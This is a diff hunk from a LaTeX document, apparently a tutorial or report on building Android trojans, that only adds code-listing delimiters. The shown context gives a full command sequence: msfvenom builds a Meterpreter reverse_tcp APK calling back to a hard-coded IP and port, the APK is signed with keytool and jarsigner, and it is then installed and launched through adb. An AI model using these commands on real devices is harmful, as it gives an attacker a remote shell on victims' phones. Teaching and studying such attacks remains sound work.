@@ -104,7 +104,9 @@ In order to create a trojan application we may use Metasploit framework. It allo
 $ msfvenom -p android/meterpreter/reverse_tcp  LHOST=188.130.155.36 LPORT=9999 R > evil.apk
 $ keytool -genkey -v -keystore my-release-key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias app
 $ jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.jks evil.apk app
+\end{lstlisting}
 In order to install it on the smartphone we have to execute the following commands:
+\begin{lstlisting}
 $ adb install evil.apk
 $ adb shell
 shell@android:/ $ am start -n com.metasploit.stage/com.metasploit.stage.MainActivity
